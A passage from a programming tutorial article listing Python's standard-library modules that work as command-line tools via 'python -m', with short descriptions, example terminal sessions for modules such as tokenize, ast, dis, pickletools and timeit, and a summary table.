</tr>
<tr>
<td><code>python -m imaplib</code></td>
<td>Like using <code>curl</code> to read email</td>
<td></td>
</tr>
<tr>
<td><code>python -m telnetlib</code></td>
<td>Like the <code>telnet</code>utility</td>
<td></td>
</tr>
</tbody>
</table>
<p>Note that the command-line interfaces for <code>uuid</code> and <code>sqlite3</code> were both added in Python 3.12.</p>
<p>I've found the <code>sqlite3</code> module handy when in a Docker container that didn't have a <code>sqlite3</code> program installed, but <em>did</em> have Python 3.12.</p>
<h2 id="working-with-python-code">Working with Python code</h2>
<p>These tools are all handy when working with Python code.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
<th>More</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m pip</code></td>
<td>Install third-party Python packages</td>
<td><a href="https://docs.python.org/3/installing/index.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m venv</code></td>
<td>Create a virtual environment</td>
<td><a href="https://docs.python.org/3/library/venv.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m pdb</code></td>
<td>Run the Python Debugger</td>
<td><a href="https://docs.python.org/3/library/pdb.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m unittest</code></td>
<td>Run <code>unittest</code> tests in a directory</td>
<td><a href="https://docs.python.org/3/library/unittest.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m pydoc</code></td>
<td>Show documentation for given string</td>
<td><a href="https://docs.python.org/3/library/pydoc.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m doctest</code></td>
<td>Run doctests for a given Python file</td>
<td><a href="https://docs.python.org/3/library/doctest.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m ensurepip</code></td>
<td>Install <code>pip</code> if it's not installed</td>
<td><a href="https://docs.python.org/3/library/ensurepip.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m idlelib</code></td>
<td>Launch Python's IDLE graphical REPL</td>
<td><a href="https://docs.python.org/3/library/idle.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m zipapp</code></td>
<td>Turn Python module into runnable ZIP</td>
<td><a href="https://docs.python.org/3/library/zipapp.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
</tbody>
</table>
<h3 id="pip"><code>pip</code></h3>
<p>The <code>pip</code> module can <a href="https://www.pythonmorsels.com/installing-python-packages/" target="_blank">installs third-party Python packages</a>.</p>
<h3 id="venv"><code>venv</code></h3>
<p>The <code>venv</code> module creates <a href="https://www.pythonmorsels.com/virtual-environments-in-python/" target="_blank">virtual environments</a>.</p>
<h3 id="pdb"><code>pdb</code></h3>
<p>The <code>pdb</code> module powers the Python debugger.
That's what the built-in <a href="https://www.pythonmorsels.com/debugging-with-breakpoint/" target="_blank"><code>breakpoint</code></a> function starts.
Running <code>pdb</code> as a command-line script will set a PDB breakpoint on the first line of your program.</p>
<h3 id="unittest"><code>unittest</code></h3>
<p>The <code>unittest</code> module can be used for writing automated tests in Python.
When running <code>unittest</code> as a command-line script will, all tests within the current directory will be identified and run automatically.</p>
<h3 id="pydoc"><code>pydoc</code></h3>
<p>Running the <code>pydoc</code> module as a command-line script will show the documentation for a given module or object.
This is the same documentation you would see if you passed the same object name to the built-in <code>help</code> function.</p>
<h3 id="doctest"><code>doctest</code></h3>
<p>Running <code>doctest</code> as a command-line script will evaluate all doctests (example code in <a href="https://www.pythonmorsels.com/docstrings/" target="_blank">docstrings</a>) within a given Python file.</p>
<h3 id="ensurepip"><code>ensurepip</code></h3>
<p>The <code>ensurepip</code> script is for folks who found that they've uninstalled <code>pip</code> and need a way to reinstall it (I did this once and it's not fun).</p>
<h3 id="idlelib"><code>idlelib</code></h3>
<p>Ever wondered how to launch Python's graphical IDLE tool from the command-line?
Run <code>python -m idlelib</code>.</p>
<h3 id="zipapp"><code>zipapp</code></h3>
<p>Want to bundle up a Python module into a ZIP file that <em>can be run directly by Python</em>?
Run <code>python -m zipapp my_module</code>.</p>
<h2 id="analyzing-python-code">Analyzing Python code</h2>
<p>Python also includes a handful of other Python-related tools that are specifically for analyzing Python code.</p>
<p>If you wanted to analyze some Python code to see how it ticks, these tools can be useful.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
<th>More</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m tokenize</code></td>
<td>Break Python module into "tokens"</td>
<td><a href="https://docs.python.org/3/library/tokenize.html#command-line-usage" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m ast</code></td>
<td>Show abstract syntax tree for code</td>
<td><a href="https://docs.python.org/3/library/ast.html#command-line-usage" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m dis</code></td>
<td>Disassemble Python code to bytecode</td>
<td><a href="https://docs.python.org/3/library/dis.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m inspect</code></td>
<td>inspect source code of a Python object</td>
<td><a href="https://docs.python.org/3/library/inspect.html#command-line-interface" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m pyclbr</code></td>
<td>See overview of a module's objects</td>
<td></td>
</tr>
</tbody>
</table>
<p>You can think of the <code>tokenize</code>, <code>ast</code>, and <code>dis</code> modules as progressively deeper steps in the process of parsing the code in a Python module.</p>
<h3 id="tokenize"><code>tokenize</code></h3>
<p>The <code>tokenize</code> module/script will break a Python file into a tree of "tokens":</p>
<div><pre><span></span><code>$ python -m tokenize hello.py
<span>0</span>,0-0,0:      ENCODING     <span>'utf-8'</span>
<span>1</span>,0-1,5:      NAME         <span>'print'</span>
<span>1</span>,5-1,6:      OP           <span>'('</span>
<span>1</span>,6-1,19:     STRING       <span>'"Hello world"'</span>
<span>1</span>,19-1,20:    OP           <span>')'</span>
<span>1</span>,20-1,21:    NEWLINE      <span>'\n'</span>
<span>2</span>,0-2,0:      ENDMARKER    <span>''</span>
</code></pre></div>
<h3 id="ast"><code>ast</code></h3>
<p>The <code>ast</code> module/script goes one step further, turning the tokens into an "abstract syntax tree":</p>
<div><pre><span></span><code>$ python -m ast hello.py
Module<span>(</span>
   <span>body</span><span>=[</span>
      Expr<span>(</span>
         <span>value</span><span>=</span>Call<span>(</span>
            <span>func</span><span>=</span>Name<span>(</span><span>id</span><span>=</span><span>'print'</span>, <span>ctx</span><span>=</span>Load<span>())</span>,
            <span>args</span><span>=[</span>
               Constant<span>(</span><span>value</span><span>=</span><span>'Hello world'</span><span>)]</span>,
            <span>keywords</span><span>=[]))]</span>,
   <span>type_ignores</span><span>=[])</span>
</code></pre></div>
<h3 id="dis"><code>dis</code></h3>
<p>The <code>dis</code> module/script disassembles the abstract syntax tree into Python's "bytecode":</p>
<div><pre><span></span><code>$ python -m dis hello.py
  <span>0</span>     <span>0</span> RESUME             <span>0</span>

  <span>1</span>     <span>2</span> PUSH_NULL
        <span>4</span> LOAD_NAME          <span>0</span> <span>(</span>print<span>)</span>
        <span>6</span> LOAD_CONST         <span>0</span> <span>(</span><span>'Hello world'</span><span>)</span>
        <span>8</span> CALL               <span>1</span>
       <span>16</span> POP_TOP
       <span>18</span> RETURN_CONST       <span>1</span> <span>(</span>None<span>)</span>
</code></pre></div>
<p>I've used <code>tokenize</code> to see how Python initially parses a module.
I used the <code>ast</code> module along to create the <a href="https://github.com/treyhunner/undataclass" target="_blank">undataclass</a> tool, along with the <code>ast</code> script which helped me figure out how Python was parsing my file.
I've used the <code>dis</code> module to try confirming a claim like "comprehensions generate fewer operations than loops".</p>
<h3 id="inspect"><code>inspect</code></h3>
<p>The <code>inspect</code> module can be used as a script to inspect the source code of a given Python object.</p>
<div><pre><span></span><code>$ python -m inspect contextlib:redirect_stdout
class redirect_stdout<span>(</span>_RedirectStream<span>)</span>:
    <span>"""Context manager for temporarily redirecting stdout to another file.</span>

<span>        # How to send help() to stderr</span>
<span>        with redirect_stdout(sys.stderr):</span>
<span>            help(dir)</span>

<span>        # How to write help() to a file</span>
<span>        with open('help.txt', 'w') as f:</span>
<span>            with redirect_stdout(f):</span>
<span>                help(pow)</span>
<span>    """</span>

    <span>_stream</span> <span>=</span> <span>"stdout"</span>
</code></pre></div>
<p>Unfortunately, it only works on objects that are implemented in Python directly.</p>
<div><pre><span></span><code>$ python -m inspect itertools:zip_longest
Can<span>'</span>t get info <span>for</span> <span>builtin</span> modules.
</code></pre></div>
<p>Using the <code>inspect</code> module as a script seems helpful in theory, but I always find myself reaching for the actual code files instead.
This may be because it's often helpful to see a bit more context than just the code for an one object: seeing inherited classes, global module state, other functions/classes, and imports are often helpful.</p>
<h3 id="pyclbr"><code>pyclbr</code></h3>
<p>The <code>pyclbr</code> module can be run as a script to get a quick overview of each class, method, and function in a specific Python module:</p>
<div><pre><span></span><code>$ python -m pyclbr timeit
def reindent <span>81</span>
class Timer <span>[]</span> <span>86</span>
  def __init__ <span>104</span>
  def print_exc <span>139</span>
  def timeit <span>166</span>
  def repeat <span>186</span>
  def autorange <span>212</span>
def timeit <span>234</span>
def repeat <span>240</span>
def main <span>246</span>
  def callback <span>324</span>
  def format_time <span>344</span>
</code></pre></div>
<p>That somewhat obfuscated <code>pyclbr</code> name stands for "Python class browser" (it was originally meant just for browsing classes and methods).</p>
<h2 id="just-for-fun">Just for fun</h2>
<p>These are Python Easter Eggs that work as Python scripts.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m __hello__</code></td>
<td>Print <code>Hello world!</code></td>
</tr>
<tr>
<td><code>python -m this</code></td>
<td>Display the Zen of Python (PEP 20)</td>
</tr>
<tr>
<td><code>python -m antigravity</code></td>
<td>Open XKCD 353 in a web browser</td>
</tr>
<tr>
<td><code>python -m turtledemo</code></td>
<td>See <code>turtle</code> module demos</td>
</tr>
</tbody>
</table>
<h3 id="__hello__"><code>__hello__</code></h3>
<p>Want to implement "hello world" in Python?
It's already implemented in the <code>__hello__</code> module!</p>
<div><pre><span></span><code>$ python -m __hello__
Hello world!
</code></pre></div>
<h3 id="this"><code>this</code></h3>
<p>Want to see the Zen of Python printed out in your terminal?
Either <code>import this</code> or run <code>this</code> as a script:</p>
<div><pre><span></span><code>$ python -m this
The Zen of Python, by Tim Peters

Beautiful is better than ugly.
Explicit is better than implicit.
Simple is better than complex.
Complex is better than complicated.
Flat is better than nested.
Sparse is better than dense.
Readability counts.
Special cases aren<span>'t special enough to break the rules.</span>
<span>Although practicality beats purity.</span>
<span>Errors should never pass silently.</span>
<span>Unless explicitly silenced.</span>
<span>In the face of ambiguity, refuse the temptation to guess.</span>
<span>There should be one-- and preferably only one --obvious way to do it.</span>
<span>Although that way may not be obvious at first unless you'</span>re Dutch.
Now is better than never.
Although never is often better than *right* now.
If the implementation is hard to explain, it<span>'s a bad idea.</span>
<span>If the implementation is easy to explain, it may be a good idea.</span>
<span>Namespaces are one honking great idea -- let'</span>s <span>do</span> more of those!
</code></pre></div>
<h3 id="antigravity"><code>antigravity</code></h3>
<p>Importing the <code>antigravity</code> module in Python will open <a href="https://xkcd.com/353/" target="_blank">an XKCD comic on Python</a> in your web browser (<a href="https://github.com/python/cpython/blob/main/Lib/antigravity.py" target="_blank">powered</a> by the <code>webbrowser</code> module mentioned above).
Running <code>antigravity</code> as a script works too:</p>

<h3 id="turtledemo"><code>turtledemo</code></h3>
<p>If you want to see a demo of different drawings you can make with Python's <code>turtle</code> module, run <code>turtledemo</code> as a script:</p>


<p>Here are a number of other slightly advanced Python-related tools.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
<th>More</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m asyncio</code></td>
<td>Launch an asyncio-aware Python REPL</td>
<td><a href="https://docs.python.org/3/library/asyncio.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m cProfile</code></td>
<td>Profile a Python program</td>
<td><a href="https://docs.python.org/3/library/profile.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m profile</code></td>
<td>Profile Python program with pure Python</td>
<td></td>
</tr>
<tr>
<td><code>python -m pstats</code></td>
<td>Show stats for profile/cProfile-generated file</td>
<td></td>
</tr>
<tr>
<td><code>python -m pickle</code></td>
<td>Display contents of a pickle file (high-level)</td>
<td><a href="https://docs.python.org/3/library/pickle.html" target="_blank">Docs</a></td>
</tr>
<tr>
<td><code>python -m pickletools</code></td>
<td>Disassemble a pickle file (low-level)</td>
<td><a href="https://docs.python.org/3/library/pickletools.html" target="_blank">Docs</a></td>
</tr>
</tbody>
</table>
<h3 id="asyncio"><code>asyncio</code></h3>
<p>If you find yourself working with <code>async</code>/<code>await</code> often in Python, you may find the asynchronous REPL handy.</p>
<div><pre><span></span><code>$ python -m asyncio
asyncio REPL <span>3</span>.12.0 <span>(</span>main, Nov <span>30</span> <span>2023</span>, <span>17</span>:49:51<span>)</span> <span>[</span>GCC <span>11</span>.4.0<span>]</span> on linux
Use <span>"await"</span> directly instead of <span>"asyncio.run()"</span>.
Type <span>"help"</span>, <span>"copyright"</span>, <span>"credits"</span> or <span>"license"</span> <span>for</span> more information.
&gt;&gt;&gt; import asyncio
&gt;&gt;&gt; await asyncio.sleep<span>(</span><span>1</span>, <span>result</span><span>=</span><span>'hello'</span><span>)</span>
<span>'hello'</span>
</code></pre></div>
<h3 id="profile"><code>cProfile</code> &amp; <code>pstats</code></h3>
<p>The <code>cProfile</code> script will profile your code by noting how long your code spent on various operations and within various functions.</p>
<div><pre><span></span><code>$ python -m cProfile -s tottime -m http.server <span>8000</span>
Serving HTTP on <span>0</span>.0.0.0 port <span>8000</span> <span>(</span>http://0.0.0.0:8000/<span>)</span> ...
^C
Keyboard interrupt received, exiting.
         <span>41242</span> <span>function</span> calls <span>(</span><span>40547</span> primitive calls<span>)</span> <span>in</span> <span>1</span>.111 seconds

   Ordered by: internal <span>time</span>

   ncalls  tottime  percall  cumtime  percall filename:lineno<span>(</span><span>function</span><span>)</span>
        <span>3</span>    <span>1</span>.075    <span>0</span>.358    <span>1</span>.075    <span>0</span>.358 <span>{</span>method <span>'poll'</span> of <span>'select.poll'</span> objects<span>}</span>
       <span>46</span>    <span>0</span>.004    <span>0</span>.000    <span>0</span>.004    <span>0</span>.000 <span>{</span>built-in method marshal.loads<span>}</span>
  <span>213</span>/211    <span>0</span>.003    <span>0</span>.000    <span>0</span>.005    <span>0</span>.000 <span>{</span>built-in method builtins.__build_class__<span>}</span>
       <span>16</span>    <span>0</span>.002    <span>0</span>.000    <span>0</span>.002    <span>0</span>.000 <span>{</span>built-in method _imp.create_dynamic<span>}</span>

... <span>[</span>Over <span>750</span> more lines of output<span>]</span>
</code></pre></div>
<p>The <code>pstat</code> command can process and compute statistics on the output of a profile file that's generated by <code>cProfile</code>.</p>
<p>The <code>profile</code> script is equivalent to the <code>cProfile</code> script, but it's written entirely in Python and is slower, so <code>cProfile</code> is preferable over <code>profile</code>.</p>
<h3 id="pickle"><code>pickle</code> &amp; <code>pickletools</code></h3>
<p>Have a pickle file and want to see what's in it?</p>
<p>Running the <code>pickle</code> module as a script will show the unpickled data:</p>
<div><pre><span></span><code>$ python -m pickle data.pickle
<span>{</span><span>'color'</span>: <span>'purple'</span>, <span>'name'</span>: <span>'duck'</span><span>}</span>
</code></pre></div>
<p>Running the <code>pickletools</code> module as a script will show a detailed explanation of each piece of the pickled data:</p>
<div><pre><span></span><code>$ python -m pickletools data.pickle
    <span>0</span>: <span>\x</span><span>80</span> PROTO      <span>4</span>
    <span>2</span>: <span>\x</span><span>95</span> FRAME      <span>36</span>
   <span>11</span>: <span>}</span>    EMPTY_DICT
   <span>12</span>: <span>\x</span><span>94</span> MEMOIZE    <span>(</span>as <span>0</span><span>)</span>
   <span>13</span>: <span>(</span>    MARK
   <span>14</span>: <span>\x</span>8c   SHORT_BINUNICODE <span>'name'</span>
   <span>20</span>: <span>\x</span><span>94</span>   MEMOIZE    <span>(</span>as <span>1</span><span>)</span>
   <span>21</span>: <span>\x</span>8c   SHORT_BINUNICODE <span>'duck'</span>
   <span>27</span>: <span>\x</span><span>94</span>   MEMOIZE    <span>(</span>as <span>2</span><span>)</span>
   <span>28</span>: <span>\x</span>8c   SHORT_BINUNICODE <span>'color'</span>
   <span>35</span>: <span>\x</span><span>94</span>   MEMOIZE    <span>(</span>as <span>3</span><span>)</span>
   <span>36</span>: <span>\x</span>8c   SHORT_BINUNICODE <span>'purple'</span>
   <span>44</span>: <span>\x</span><span>94</span>   MEMOIZE    <span>(</span>as <span>4</span><span>)</span>
   <span>45</span>: u      SETITEMS   <span>(</span>MARK at <span>13</span><span>)</span>
   <span>46</span>: .    STOP
highest protocol among <span>opcodes</span> <span>=</span> <span>4</span>
</code></pre></div>

<p>Here are <em>even more</em> Python-related tools which are oddly meta.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m code</code></td>
<td>Run a Python REPL</td>
</tr>
<tr>
<td><code>python -m runpy</code></td>
<td>Run a Python module as a script</td>
</tr>
</tbody>
</table>
<h3 id="code"><code>code</code></h3>
<p>The <code>code</code> module is used for making interactive Python interpreters, so running it will basically run a version of the interactive Python REPL:</p>
<div><pre><span></span><code>$ python -m code
Python <span>3</span>.12.0 <span>(</span>main, Nov <span>30</span> <span>2023</span>, <span>17</span>:49:51<span>)</span> <span>[</span>GCC <span>11</span>.4.0<span>]</span> on linux
Type <span>"help"</span>, <span>"copyright"</span>, <span>"credits"</span> or <span>"license"</span> <span>for</span> more information.
<span>(</span>InteractiveConsole<span>)</span>
&gt;&gt;&gt;
</code></pre></div>
<h3 id="runpy"><code>runpy</code></h3>
<p>The <code>runpy</code> module is used for dynamically running a given Python module by its name.
The fact that it has a command-line interface is a bit odd, since it essentially does what Python already does for us!</p>
<p>Here's <code>runpy</code> running <code>runpy</code> running <code>runpy</code> running the <code>unittest</code> module:</p>
<div><pre><span></span><code>$ python -m runpy runpy runpy unittest

----------------------------------------------------------------------
Ran <span>0</span> tests <span>in</span> <span>0</span>.000s

NO TESTS RAN
</code></pre></div>

<p>The remaining tools are ones that are unlikely to be useful often.</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Purpose</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>python -m timeit</code></td>
<td>Time a Python expression</td>
</tr>
<tr>
<td><code>python -m site</code></td>
<td>See "site" information about Python</td>
</tr>
<tr>
<td><code>python -m sysconfig</code></td>
<td>Show Python configuration details</td>
</tr>
<tr>
<td><code>python -m platform</code></td>
<td>Display current platform information</td>
</tr>
<tr>
<td><code>python -m mimetypes</code></td>
<td>Show file mimetype/extension details</td>
</tr>
<tr>
<td><code>python -m quopri</code></td>
<td>Encode/decode raw email data</td>
</tr>
<tr>
<td><code>python -m filecmp</code></td>
<td>Compare contents of 2 directories</td>
</tr>
<tr>
<td><code>python -m encodings.rot_13</code></td>
<td>ROT-13 encode/decode text</td>
</tr>
<tr>
<td><code>python -m tabnanny</code></td>
<td>Check Python file for mixed tabs &amp; spaces</td>
</tr>
</tbody>
</table>
<h3 id="timeit"><code>timeit</code></h3>
<p>If you need time how long a single Python expression takes to run, you could use <code>timeit</code> as a script:</p>
<div><pre><span></span><code>$ python -m timeit <span>'sum([list(range(1000))] * 50, [])'</span>
<span>100</span> loops, best of <span>5</span>: <span>2</span>.2 msec per loop
$ python -m timeit <span>'import itertools; itertools.chain.from_iterable([list(range(1000))] * 50)'</span>
<span>20000</span> loops, best of <span>5</span>: <span>10</span>.5 usec per loop
</code></pre></div>
<p>You may find it surprising that I include <code>timeit</code> in the list of rarely useful tools.
I actually find the <code>timeit</code> module <em>very useful</em>, but I find that I pretty much always need to use it as a module rather than a script.
<a href="https://docs.python.org/3/library/timeit.html#basic-examples" target="_blank">More on using <code>timeit</code> in the documentation</a>.</p>
<h3 id="site"><code>site</code></h3>
<p>Running the <code>site</code> module as a script will show a bit of information about your current Python environment, including <code>sys.path</code> (which shows the directories in your <code>PYTHONPATH</code>).</p>
<div><pre><span></span><code>$ python -m site
sys.path <span>=</span> <span>[</span>
    <span>'/home/trey/repos/business/screencasts'</span>,
    <span>'/home/trey/.pyenv/versions/3.12.0/lib/python312.zip'</span>,
    <span>'/home/trey/.pyenv/versions/3.12.0/lib/python3.12'</span>,
    <span>'/home/trey/.pyenv/versions/3.12.0/lib/python3.12/lib-dynload'</span>,
    <span>'/home/trey/.local/lib/python3.12/site-packages'</span>,
    <span>'/home/trey/.pyenv/versions/3.12.0/lib/python3.12/site-packages'</span>,
<span>]</span>
USER_BASE: <span>'/home/trey/.local'</span> <span>(</span>exists<span>)</span>
USER_SITE: <span>'/home/trey/.local/lib/python3.12/site-packages'</span> <span>(</span>exists<span>)</span>
ENABLE_USER_SITE: True
</code></pre></div>
<p>The <code>--user-base</code> or <code>--user-site</code> arguments can be passed to the <code>site</code> script to see just the location of those two directories:</p>
<div><pre><span></span><code>$ python -m site --user-base
/home/trey/.local
$ python -m site --user-site
/home/trey/.local/lib/python3.12/site-packages
</code></pre></div>
<h3 id="sysconfig"><code>sysconfig</code></h3>
<p>Running the <code>sysconfig</code> module as a script will show a <em>huge</em> amount of information about your Python installation.</p>
<div><pre><span></span><code>$ python3.12 -m sysconfig <span>|</span> less
Platform: <span>"linux-x86_64"</span>
Python version: <span>"3.12"</span>
Current installation scheme: <span>"posix_prefix"</span>

Paths:
        <span>data</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0"</span>
        <span>include</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0/include/python3.12"</span>
        <span>platinclude</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0/include/python3.12"</span>
        <span>platlib</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0/lib/python3.12/site-packages"</span>
        <span>platstdlib</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0/lib/python3.12"</span>
        <span>purelib</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0/lib/python3.12/site-packages"</span>
        <span>scripts</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0/bin"</span>
        <span>stdlib</span> <span>=</span> <span>"/home/trey/.pyenv/versions/3.12.0/lib/python3.12"</span>

Variables:
        <span>ABIFLAGS</span> <span>=</span> <span>""</span>
        <span>AC_APPLE_UNIVERSAL_BUILD</span> <span>=</span> <span>"0"</span>

... <span>[</span>Over <span>1000</span> more lines of output<span>]</span>
</code></pre></div>
<h3 id="platform"><code>platform</code></h3>
<p>The <code>platform</code> script will tell you information about your operating system kernel:</p>
<div><pre><span></span><code>$ python -m platform
Linux-6.5.0-1023-oem-x86_64-with-glibc2.35
</code></pre></div>
<h3 id="mimetypes"><code>mimetypes</code></h3>
<p>You can use <code>mimetypes</code> to find the file extension for a given file type:</p>
<div><pre><span></span><code>$ python -m mimetypes -e <span>'text/markdown'</span>
.md
</code></pre></div>
<p>Or you can use <code>mimetypes</code> to discover the type of a given file:</p>
<div><pre><span></span><code>$ python -m mimetypes README.md
type: text/markdown encoding: None
</code></pre></div>
<h3 id="quopri"><code>quopri</code></h3>
<p>The <code>quopri</code> command encode/decode quoted-printable data for raw email data:</p>
<div><pre><span></span><code>$ <span>echo</span> <span>'Hi! 👋'</span> <span>|</span> python -m quopri
Hi! <span>=</span><span>F0</span><span>=</span><span>9F</span><span>=</span><span>91</span><span>=</span>8B
</code></pre></div>
<h3 id="filecmp"><code>filecmp</code></h3>
<p>The <code>filecmp</code> script accepts two directories and notes which files are different or the same between them.
It has a very primitive command-line interface.</p>
<div><pre><span></span><code>$ python -m filecmp dir1 dir2
diff dir1 dir2
Only <span>in</span> dir1 : <span>[</span><span>'c'</span>, <span>'sub2'</span><span>]</span>
Only <span>in</span> dir2 : <span>[</span><span>'d'</span>, <span>'sub3'</span><span>]</span>
Identical files : <span>[</span><span>'a'</span><span>]</span>
Differing files : <span>[</span><span>'b'</span><span>]</span>
Common subdirectories : <span>[</span><span>'sub1'</span><span>]</span>
</code></pre></div>
<p>It's similar to the command-line <code>diff</code> utility but it only works on directories and its output is less readable.</p>
<h3 id="rot13"><code>encodings.rot_13</code></h3>
<p>Need to ROT-13 encode/decode some text?
Probably not.
But Python has a command-line tool for that.</p>
<div><pre><span></span><code>$ <span>echo</span> <span>'Hello!'</span> <span>|</span> python -m encodings.rot_13
Uryyb!
$ <span>echo</span> <span>'Uryyb!'</span> <span>|</span> python -m encodings.rot_13
Hello!
</code></pre></div>
<h3 id="tabnanny"><code>tabnanny</code></h3>
<p>Need to check whether a Python file mixes tabs and spaces?
Hopefully not!</p>
<div><pre><span></span><code>$ python -m tabnanny example.py
example.py <span>3</span> <span>"\tprint('Hi')"</span>
</code></pre></div>
<p>This used to be legal syntax in Python 2, but in Python 3 it's not valid anymore, so a <code>SyntaxError</code> will usually tell you something is wrong without needing to deliberately check.</p>
<h2 id="cheat-sheet">Every command-line tool in Python</h2>
<p>Here's a quick summary of every command-line tool in Python:</p>
<table>
<thead>
<tr>
<th>Module/Script</th>
<th>Purpose</th>
<th>Category</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="#httpserver" target="_blank"><code>http.server</code></a></td>
<td>Start a simple web server</td>
<td>General</td>
</tr>
<tr>
<td><a href="#webbrowser" target="_blank"><code>webbrowser</code></a></td>
<td>Launch your web browser</td>
<td>General</td>
</tr>
<tr>
<td><a href="#jsontool" target="_blank"><code>json.tool</code></a></td>
<td>Nicely format JSON data</td>
<td>General</td>
</tr>
<tr>
<td><a href="#calendar" target="_blank"><code>calendar</code></a></td>
<td>Show a command-line calendar</td>
<td>General</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>uuid</code></a></td>
<td>Like <code>uuidgen</code> CLI utility</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>sqlite3</code></a></td>
<td>Like <code>sqlite3</code> CLI utility</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>zipfile</code></a></td>
<td>Like <code>zip</code> &amp; <code>unzip</code> CLI utilities</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>gzip</code></a></td>
<td>Like <code>gzip</code> &amp; <code>gunzip</code> CLI utilities</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>tarfile</code></a></td>
<td>Like the <code>tar</code> CLI utility</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>base64</code></a></td>
<td>Like the <code>base64</code> CLI utility</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>ftplib</code></a></td>
<td>Like the <code>ftp</code> utility</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>smtplib</code></a></td>
<td>Like the <code>sendmail</code> utility</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>poplib</code></a></td>
<td>Like using <code>curl</code> to read email</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>imaplib</code></a></td>
<td>Like using <code>curl</code> to read email</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#windows" target="_blank"><code>telnetlib</code></a></td>
<td>Like the <code>telnet</code>utility</td>
<td>Linux-like</td>
</tr>
<tr>
<td><a href="#pip" target="_blank"><code>pip</code></a></td>
<td>Install third-party Python packages</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#venv" target="_blank"><code>venv</code></a></td>
<td>Create a virtual environment</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#pdb" target="_blank"><code>pdb</code></a></td>
<td>Run the Python Debugger</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#unittest" target="_blank"><code>unittest</code></a></td>
<td>Run <code>unittest</code> tests in a directory</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#pydoc" target="_blank"><code>pydoc</code></a></td>
<td>Show documentation for given string</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#doctest" target="_blank"><code>doctest</code></a></td>
<td>Run doctests for a given Python file</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#ensurepip" target="_blank"><code>ensurepip</code></a></td>
<td>Install <code>pip</code> if it's not installed</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#idlelib" target="_blank"><code>idlelib</code></a></td>
<td>Launch Python's IDLE graphical REPL</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#zipapp" target="_blank"><code>zipapp</code></a></td>
<td>Turn Python module into runnable ZIP</td>
<td>Python</td>
</tr>
<tr>
<td><a href="#tokenize" target="_blank"><code>tokenize</code></a></td>
<td>Break Python module into "tokens"</td>
<td>Inspect code</td>
</tr>
<tr>
<td><a href="#ast" target="_blank"><code>ast</code></a></td>
<td>Show abstract syntax tree for code</td>
<td>Inspect code</td>
</tr>
<tr>
<td><a href="#dis" target="_blank"><code>dis</code></a></td>
<td>Disassemble Python code to bytecode</td>
<td>Inspect code</td>
</tr>
<tr>
<td><a href="#inspect" target="_blank"><code>inspect</code></a></td>
<td>inspect source code of a Python object</td>
<td>Inspect code</td>
</tr>
<tr>
<td><a href="#pyclbr" target="_blank"><code>pyclbr</code></a></td>
<td>See overview of a module's objects</td>
<td>Inspect code</td>
</tr>
<tr>
<td><a href="#asyncio" target="_blank"><code>asyncio</code></a></td>
<td>Launch an asyncio-aware REPL</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#profile" target="_blank"><code>cProfile</code></a></td>
<td>Profile a Python program</td>
<td>Deep Python</td>
</tr>
<tr>
<td><a href="#profile" target="_blank"><code>profile</code></a></td>
<td>Profile Python program with Python</td>
<td>Deep Python</td>
</tr>
<tr>
